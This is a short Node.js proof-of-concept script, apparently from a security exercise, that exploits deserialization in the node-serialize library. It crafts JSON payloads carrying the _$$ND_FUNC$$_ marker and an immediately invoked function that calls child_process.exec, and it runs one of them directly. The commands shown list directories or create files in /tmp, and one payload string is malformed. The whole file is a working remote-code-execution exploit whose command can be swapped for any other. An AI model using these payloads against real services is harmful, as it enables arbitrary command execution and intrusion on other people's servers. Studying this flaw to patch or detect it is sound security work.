var serialize = require('node-serialize');
var ls_serialize_me = {rce : function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}}
console.log("Serialized: \n" + serialize.serialize(ls_serialize_me));

var ls_payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(ls_payload);

var touch_serialize_me = {rce : function(){ require('child_process').exec('touch /tmp/spurgeonc', function() {} );}}
var touch_payload = '{""rce":"_$$ND_FUNC$$_function(){ require(\'child_process\').exec(\'touch /tmp/spurgeonc\', function() {} );}()"}'

var ls_payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /tmp\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
var touch_payload = '{"rce":"_$$ND_FUNC$$_function(){ require(\'child_process\').exec(\'touch /tmp/wuchang\', function() {} );}()"}'